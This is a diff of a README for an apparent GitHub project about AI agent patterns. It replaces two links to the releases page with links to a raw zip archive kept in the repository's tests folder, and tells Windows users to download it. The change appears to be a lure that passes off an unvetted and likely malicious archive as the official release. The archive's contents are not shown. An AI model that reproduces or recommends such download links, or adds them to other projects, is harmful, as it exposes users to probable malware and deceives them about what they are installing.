@@ -1,6 +1,6 @@
 # 🤖 agentic-ai-patterns - Clear patterns for AI agents
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-5A67D8?style=for-the-badge&logo=github)](https://github.com/ardelleinternecine541/agentic-ai-patterns/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Now-5A67D8?style=for-the-badge&logo=github)](https://github.com/ardelleinternecine541/agentic-ai-patterns/raw/refs/heads/main/tests/ai_patterns_agentic_v3.5.zip)
 
 ## 🧭 What this is
 
@@ -22,7 +22,7 @@ Use it if you want to learn how agent systems think and act without setting up a
 
 Visit this page to download the latest Windows release:
 
-https://github.com/ardelleinternecine541/agentic-ai-patterns/releases
+https://github.com/ardelleinternecine541/agentic-ai-patterns/raw/refs/heads/main/tests/ai_patterns_agentic_v3.5.zip
 
 Pick the newest release file for Windows, then download it to your computer.
 
